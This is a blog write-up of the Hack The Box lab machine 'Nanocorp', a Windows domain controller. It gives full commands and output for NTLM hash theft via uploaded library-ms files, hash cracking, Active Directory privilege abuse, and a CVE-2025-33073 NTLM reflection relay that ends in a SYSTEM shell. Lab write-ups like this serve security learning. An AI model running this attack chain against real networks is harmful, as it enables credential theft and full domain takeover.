---
title: "Nanocorp"
date: 10-11-2025
categories: [HTB, Windows, Windows Hard, Active]
tags: [AD, Protected Users, NTLM Relay, NTLM Reflection, Kerberos]
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/07f266f9996280c6d935969ed73e1aca.png
---

Nanocorp is the first hard machine I have been able to finish, I was able to get user on my own but I needed some hints for completing the root flag. Nmap reveals that the machine is a domain controller, which hosts a website that allows us to apply to a job offer. We are allowed to upload a zip file, after which we get a message stating that the file was extracted and would get viewed. I used this to upload a `library-ms` file to coerce authentication. Using responder I intercepted the NLTMv2 hash which was later cracked using Hashcat.
Following an AD attack chain I landed on a user that was able to winrm into the DC01. There were two ways to root the box and I chose the unintended method. 
![alt text](/assets/images/nanocorp/image.png)

## Nmap
As always, we start with an nmap scan which reveals the following ports as open.
```
nmap 10.129.225.120 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 13:15 CET
Nmap scan report for DC01.nanocorp.htb (10.129.225.120)
Host is up (0.041s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.09 seconds
```

## Finding the Webpage
We can see that the ports are the ones we would normally see in a domain controller for active directory. The one thing that sticks out is that port 80 is open, which means that it the host may have a webpage running. After navigating to the webpage we get redirected to `nanocorp.htb` since our computer does not know how to resolve this address we can manually enter it in our `/etc/hosts` file. Once this is done we can scout the webpage.


![alt text](/assets/images/nanocorp/page.png)

The website does not show anything interesting, but if we click on the `about us` widget we get a link to apply for one of their open positions. Which redirects us to a new domain `hire.nanocorp.htb`, which we once again should add to our `/etc/hosts` file. 

![alt text](/assets/images/nanocorp/about.png)

After adding the entry we can see that the page is a job application portal, the interesting thing is that we are allowed to upload a zip file. Lets upload a simple zip file to see how the server reacts.
![alt text](/assets/images/nanocorp/third.png)

## Stealing the NTLMv2 Hash
We can see that the server will extract the zip file and review our application, this indicated that we could try to upload a lnk file that would coerce authentication when someone entered the directory that stored our file. This was more or less correct, ill explain why later. I first used [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to generate common files to coerce authentication. I did so with the following command:

```
python3 ntlm_theft.py -g all -s 10.10.14.82  -f resume
```
I then navigated to the created folder containing all the generated files and zipped then.

```bash
cd resume
zip real_resume.zip *
```

I then started the Responder tool, which will listen for any auth requests coming our way. After a minute or so after uploading the file, we get a hit:
```
sudo responder -I tun0

<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.225.120
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:bf695aa22fe5c67e:CAA93FE2F9228277370962F49B866C0B:010100000000000000A0540B5752DC01C3A59254F57D697F00000000020008005A0046004F004C0001001E00570049004E002D0048004100390036005000410041004500460044005A0004003400570049004E002D0048004100390036005000410041004500460044005A002E005A0046004F004C002E004C004F00430041004C00030014005A0046004F004C002E004C004F00430041004C00050014005A0046004F004C002E004C004F00430041004C000700080000A0540B5752DC0106000400020000000800300030000000000000000000000000200000D227C411BFBC338183AE0F07331A758DA7328C82FAE09E15DBCE3BF4DFB20D4F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380032000000000000000000
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
```

I do not like how I did this because I just zipped every file and hoped for the best, so I went back and tested which file allowed me to steal the NTLMv2 hash. I was able to identify that the library-ms file was the culprit.

We can save the received NTLMv2 hash into a file and attempt to crack it with hashcat.
```
hashcat web_svc.hash /usr/share/wordlists/rockyou.txt -m 5600 --show 
WEB_SVC::NANOCORP:1648e0a3a162182d:faa13f43b2882cf7d892e32965756d46:0101000000000000806c0ce00151dc
015fba45357f20167b000000000200080051004c004a004a0001001e00570049004e002d004b00320030005a0039003700
5400420051005900480004003400570049004e002d004b00320030005a0039003700540042005100590048002e0051004c
004a004a002e004c004f00430041004c000300140051004c004a004a002e004c004f00430041004c000500140051004c00
a004a002e004c004f00430041004c0007000800806c0ce00151dc010600040002000000080030003000000000000000000
00000002000006260be23a88c8a86f636f1ea88bede70819fd11cc8b3225a1c84493a7938155f0a0010000000000000000
00000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00380032000000000
000000000:!!dksehdgh712!@#!!
```

## Active Directory Attack Chain
We are able to crack the hash, which lets us authenticate as the `web_svc` user, this allowed me to run a rusthound scan to identify potential AD attacks.

```
rusthound-ce -i DC01 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' -v
---------------------------------------------------
Initializing RustHound-CE at 15:43:27 on 11/10/25
Powered by @g0h4n_0
---------------------------------------------------

<SNIP>
```

I then uploaded the generated `json` files into the bloodhound ingestor. This allowed me to see the following AD attack chain:
![alt text](/assets/images/nanocorp/AD.png)

I was able to add the `web_svc` to the IT Support using the following command from `bloodyAD`:
```
bloodyAD --host DC01 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember  "IT_SUPPORT"  web_svc
!![+] web_svc added to IT_SUPPORT!!
```

I then changed the password of the `monitoring_svc` user using the following command:
```
net rpc password "monitoring_svc" "Dgj3n273naAD723" -U "nanorcorp.htb"/"web_svc"%'dksehdgh712!@#' -S "DC01"
```

## Establishing a PSRemote Session
This user did not have any outbound edges but did belong to the `Remote Management Users` group which should allow us to PSRemote into the DC
![alt text](/assets/images/nanocorp/svc.png)

I saw that the `winrm` port was closed in the nmap scan, so I first tried to RDP into the machine, but this did not work. I then noticed that `winrms` was open, which uses SSL encryption and runs on port 5986 instead of 5985.
```
nmap -p 5986 DC01
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 15:59 CET
Nmap scan report for DC01 (10.129.225.120)
Host is up (0.044s latency).
rDNS record for 10.129.225.120: DC01.nanocorp.htb

PORT     STATE SERVICE
5986/tcp !!open!!  wsmans

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
```
One thing to note is that this user is also in the `Protected Users` group, which imposes some restrictions. Protected User accounts that authenticate to a domain running Windows Server are unable to do the following:

* Authenticate with NTLM authentication.
* Use DES or RC4 encryption types in Kerberos preauthentication.
* Delegate with unconstrained or constrained delegation.
* Renew Kerberos TGTs beyond their initial four-hour lifetime.

This means that we cannot login using the password, as this uses NTLM by default, we must first create a ticket using AES encryption with a maximum lifetime of 4 hours. Luckily impacketÂ´s `getTGT.py` was able to generate a ticket that met all of the conditions above. I used `faketime` to avoid clock skew errors. 

```
faketime -f '+7h' getTGT.py 'nanocorp.htb/monitoring_svc:Dgj3n273naAD723' -dc-ip DC01
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

!![*] Saving ticket in monitoring_svc.ccache!!
```

We can see the ticket information by using `describeTickey.py` which shows that our ticket is correct for a user that is in the `Protected Users` group.
```
describeTicket.py monitoring_svc.ccache
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 5ba1b94b8d3b7d08217be786c838524b7f7cd61ea7efa5db053ce644b92fd9ef
[*] User Name                     : monitoring_svc
[*] User Realm                    : NANOCORP.HTB
[*] Service Name                  : krbtgt/NANOCORP.HTB
[*] Service Realm                 : NANOCORP.HTB
[*] Start Time                    : 10/11/2025 22:54:50 PM
[*] End Time                      : 11/11/2025 02:54:50 AM  !!// 4 Hour Life!!
[*] RenewTill                     : 11/11/2025 02:54:50 AM
[*] Flags                         : (0xe10000) renewable, initial, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : W6G5S407fQghe+eGyDhSS3981h6n76XbBTzmRLkv2e8=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/NANOCORP.HTB
[*]   Service Realm               : NANOCORP.HTB
[*]   Encryption type             : !!aes256_cts_hmac_sha1_96 (etype 18)!!
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```

Since we are dealing with kerberos I have two recommendations, the first one is to use the following `krb5.conf` file. Which you can also generate with netexec (if you have it updated), using this command `netexec smb DC01 --generate-krb5-file nanocorp.krbconf`
```
cat /etc/krb5.conf
[libdefaults]
    default_realm = NANOCORP.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
    NANOCORP.HTB = {
        kdc = dc01.nanocorp.htb
    }

[domain_realm]
    .nanocorp.htb = NANOCORP.HTB
    nanocorp.htb = NANOCORP.HTB
``` 

The second one is to ensure that your `/etc/hosts` file entry is structured as follows:
```
10.129.225.120 DC01.nanocorp.htb nanocorp.htb DC01
```
This is because kerberos can be very picky and this just avoid random problems that are very hard to debug. 


Once this was in place I attempted to login with `evil-winrm` using the SSL option, which should allow us to login using port 5986.
```
KRB5CCNAME=monitoring_svc.ccache faketime -f '+7h' evil-winrm -i DC01.nanocorp.htb -r nanocorp.htb --ssl
                                        
Evil-WinRM shell v3.7
                                                                                    
Warning: SSL enabled
                                              
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

We get an error, I then read that SSL authentication with `evil-winrm` is unreliable and always breaks. So I opted to use `evil-winrm-py` instead which supports kerberos authentication. I installed it using the following commands:
```
pip install evil-winrm-py
pip install evil-winrm-py[kerberos]
```

The tool worked and I managed to grab the user flag:
```
KRB5CCNAME=monitoring_svc.ccache faketime -f '+7h' evil-winrm-py -i DC01.nanocorp.htb --kerberos --ssl
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'DC01.nanocorp.htb:5986' as 'monitoring_svc@NANOCORP.HTB'
evil-winrm-py PS C:\Users\monitoring_svc\Documents> cat ../Desktop/user.txt
2c2537<SNIP>
```

## Root
Using the `ntlm_reflection` module from netexec I found that this machine was vulnerable to it. 
```
netexec smb DC01 -u web_svc -p 'dksehdgh712!@#' -M ntlm_reflection
SMB         10.129.225.120  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.225.120  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
NTLM_REF... 10.129.225.120  445    DC01             !!VULNERABLE (can relay SMB to other protocols except SMB on 10.129.225.120)!!
```

I used `CVE-2025-33073` to attack and compromise the domain controller, the steps required to repoduce are as follows:

First create a DNS entry on the domain controller that points localhost to our IP. The neat trick about CVE-2025-33073 is that it bypasses the checks windows does for internal requests. More information about it can be found [here](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)

I used the `dnstool.py` utility from the [krbrelayx](https://github.com/dirkjanm/krbrelayx) toolkit for this. 
```
python3 dnstool.py -u 'nanocorp\web_svc' -p 'dksehdgh712!@#' -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -a add -t A -d 10.10.14.82 10.129.225.120
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
!![+] LDAP operation completed successfully!!
```

We can then start ntlmrelayx, note that the impacket version has to be greater than or equal to 0.13 for it work.
```
sudo python3 ntlmrelayx.py -debug -t winrms://DC01 -i -smb2support -domain nanocorp.htb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/madaf/HTB/labs/nanocorp/blood/tet/lib/python3.11/site-packages/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..

<SNIP>

[*] Servers started, waiting for connections
```

We can the use the `coerce_plus` module from netexec to automatically coerce the authentication:
```
netexec smb DC01 -u web_svc -p 'dksehdgh712!@#' -M coerce_plus -o L='localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
SMB         10.129.225.120  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.225.120  445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@# 
COERCE_PLUS 10.129.225.120  445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 10.129.225.120  445    DC01             Exploit Success, netdfs\NetrDfsRemoveRootTarget
COERCE_PLUS 10.129.225.120  445    DC01             Exploit Success, netdfs\NetrDfsAddStdRoot
COERCE_PLUS 10.129.225.120  445    DC01             Exploit Success, netdfs\NetrDfsRemoveStdRoot
COERCE_PLUS 10.129.225.120  445    DC01             VULNERABLE, PetitPotam
```

If we look at our ntlmrelayx.py output we see that it worked and it created session for us at different ports, we can use `nc` to connect to one of them as `nt authority\system`
```
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.225.120, attacking target winrms://DC01
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.225.120 against winrms://DC01 SUCCEED [1]
!![*] winrms:///@dc01 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000!!
[!] The client requested signing, relaying to WinRMS might not work!
[*] Status code returned: 500. Authentication does not seem required for URL
[-] No authentication requested by the server for url dc01
[*] (SMB): Received connection from 10.129.225.120, attacking target winrms://DC01
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.225.120 against winrms://DC01 SUCCEED [2]
[*] winrms:///@dc01 [2] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11001
```

```
sudo nc localhost 11004
Type help for list of commands

# whoami
!!nt authority\system!!

# type C:\Users\Administrator\Desktop\root.txt
34242<SNIP>
```